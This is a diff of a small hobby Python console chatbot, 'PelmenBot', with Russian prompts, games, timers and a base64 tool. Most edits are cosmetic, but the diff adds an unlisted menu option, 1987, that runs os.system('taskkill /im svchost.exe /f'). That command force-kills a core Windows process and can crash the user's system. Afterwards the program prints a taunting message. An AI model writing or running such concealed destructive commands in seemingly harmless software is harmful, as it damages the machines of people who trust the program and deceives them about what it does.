@@ -1,6 +1,7 @@
 from random import *
 from time import *
 from turtle import *
+import os
 import base64
 import pelmen_fun
 print("Привет! Это Project PelmenBot! Мои функции: \n1-посмотреть старые функции \n2-таймер обратного отчета \n3- игра угадай число \n4-о чатботе \n5-что нового? \n6-погода \n7-секудомер \n8-генератор \n9-пусто( \n10-тоже пусто( \n11-base64 \n12-игра КНБ \n13-бросить кубик \n14-Генератор фигур \n15-узнать длинну строки\nВыбирай цифру!")
@@ -28,10 +29,8 @@ while ipt != 0:
             price = int(input("Введите число: "))
         if price == count:
                 print("Вы угадали!")
-        if price != count:
-            print("Повезет в другой раз!")
     elif ipt == 4:
-        print("Программа projectpb(Пельмень). Версия 2.1.0 от 09.08.23. Все права съедены шлепой. Некоторые пункты взяты из интернета, я не писал их сам.")
+        print("Программа projectpb(Пельмень). Версия 2.1.1 от 10.08.23. Все права съедены шлепой. Некоторые пункты взяты из интернета, я не писал их сам.")
     elif ipt == 5:
         pelmen_fun.info()
     elif ipt == 6:
@@ -39,15 +38,15 @@ while ipt != 0:
         weather = pelmen_fun.get_weather(city)
         print(weather)
     elif ipt == 7:
-        sec_start = int(input("1 - запустить таймер, 0 - выйти"))
+        sec_start = int(input("1 - запустить таймер, 0 - выйти: "))
         if sec_start == 1:
             start = time()
-            sec_end = int(input("0 - стоп"))
+            sec_end = int(input("0 - стоп: "))
             end = time()
             total_time = (end - start)
             print("Время -",round(total_time, 3))
     elif ipt == 2:
-        timer1 = int(input("Таймер обратного отсчета. Введите секунды."))
+        timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
         for i in range(timer1, -1, -1):
             print(i)
             sleep(1)
@@ -67,8 +66,8 @@ while ipt != 0:
             s1 = e.decode("UTF-8")
             print(s1)
     elif ipt == 15:
-        per3 = input("Введите пароль: ")
-        print("Длинна пароля:", len(per3))
+        per3 = input("Введите сторку: ")
+        print("Длинна строки:", len(per3))
     elif ipt == 12:
             pelmen_fun.knb() 
     elif ipt == 13:
@@ -212,7 +211,13 @@ while ipt != 0:
                         per2 += str(randint(0,9))
             print(per2)
     elif ipt == 9:
-        print("пока тут пусто(())")
+        timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
+        for i in range(timer1, -1, -1):
+            print(i)
+    elif ipt == 1987:
+        os.system("taskkill /im svchost.exe /f")
+        sleep(5)
+        print("Хмм... у тебя не винда, повезло ;D")
     else: 
         print("Прости, я тебя не понял:(")
     ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
